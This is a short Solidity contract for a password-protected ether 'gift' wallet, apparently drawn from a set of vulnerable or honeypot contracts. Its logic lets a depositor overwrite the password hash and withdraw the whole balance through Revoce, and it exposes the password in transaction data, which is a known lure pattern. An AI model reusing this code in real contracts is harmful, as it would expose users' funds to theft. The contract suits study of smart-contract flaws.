pragma solidity ^0.4.19;

contract updated_years_gift
{
    string alert;

    bool passHasBeenCollection = false;

    address requestor;

    bytes32 public checksumPass;

    function() public payable{}

    function RetrieveVerification(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function GroupPass(bytes32 signature)
    public
    payable
    {
        if( (!passHasBeenCollection&&(msg.value > 1 ether)) || checksumPass==0x0 )
        {
            checksumPass = signature;
            requestor = msg.sender;
        }
    }

    function CollectionAlert(string _message)
    public
    {
        if(msg.sender==requestor)
        {
            alert =_message;
        }
    }

    function RetrieveGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(checksumPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return alert;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==requestor)
        {
            requestor.transfer(this.balance);
            alert="";
        }
    }

    function PassHasBeenCollection(bytes32 signature)
    public
    {
        if(msg.sender==requestor&&signature==checksumPass)
        {
           passHasBeenCollection=true;
        }
    }
}